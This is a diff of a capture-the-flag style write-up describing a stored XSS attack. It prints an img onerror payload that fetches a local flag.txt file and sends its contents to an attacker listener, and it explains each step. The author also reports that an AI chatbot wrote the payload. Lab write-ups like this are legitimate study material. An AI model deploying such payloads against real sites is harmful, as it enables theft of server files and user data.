@@ -1,5 +1,3 @@
-ROUGH WRITEUP NOT COMPLETE
-
 ![image](https://github.com/user-attachments/assets/c3a16a82-63e5-4467-b055-282e5a2316d5)
 
 ____________________________________________________________________________________________________________________ 
@@ -56,15 +54,17 @@ ________________________________________________________________________________
   
 Knowing this information, I basically fed the question to chatgpt and it provided me a lovely crafted response with additional lines added onto the initial injected code as seen below:
 
-<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.10.239.245:8080/?c=' + r))"/>
+``` <img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.10.239.245:8080/?c=' + r))"/> ```
 
-This is very similar to the previous injection, but this time taking data from http:IP_ADDR/flag.txt instead. This would work using this method but not when searched on my own device as this is the website doing a lookup for its own material, therefore it will always have access to it. 
+This is very similar to the previous injection, but this time taking data from the /flag.txt/ directory instead.
 
 This works as Follows:
 
-.then(r => r.text()) = This converts the response to text
+**.then(r => r.text())** -> This converts the response to text
 
-.then(r => fetch('http://10.11.116.53:8080/?c=' + r)) = This sends the converted response to the attacker IP who is listening
+**.then(r => fetch('http://attacker_ip:8080/?c=' + r))** -> This sends the converted response to the attacker IP who is listening
+
+All together, it makes the web server send a request to itself on its local ip, converts the response it has gathered from the page to text, then sends it to the attacker IP who will be listening again using netcat.
 
 ![image](https://github.com/user-attachments/assets/33c82a30-a34c-49fa-bef4-8f333bb41509)
 
